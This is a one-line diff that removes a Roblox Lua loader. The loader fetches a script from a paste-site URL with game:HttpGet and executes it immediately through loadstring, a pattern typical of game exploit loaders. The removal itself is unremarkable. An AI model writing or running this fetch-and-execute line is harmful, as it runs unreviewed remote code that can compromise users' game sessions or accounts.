@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://www.klgrth.io/paste/tdrv3/raw')))()
